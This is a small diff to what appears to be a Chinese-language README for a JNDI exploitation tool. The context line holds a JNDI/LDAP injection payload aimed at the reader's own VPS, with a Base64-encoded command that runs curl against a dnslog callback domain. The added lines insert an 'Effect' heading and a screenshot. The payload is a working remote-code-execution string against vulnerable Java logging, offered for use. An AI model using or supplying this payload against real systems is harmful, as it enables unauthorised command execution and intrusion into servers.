@@ -11,3 +11,7 @@ JNDI：
 ```
 JNDI:ldap://你的VPSIP:1389/Basic/Command/Base64/Y3VybCB4eHh4c3Nzam5kaWV4cHgyMjJ4eC50cnh4emZpLmkuZG5zbG9nLmNu
 ```
+
+# 效果：
+
+![avatar](jndiexp.PNG)
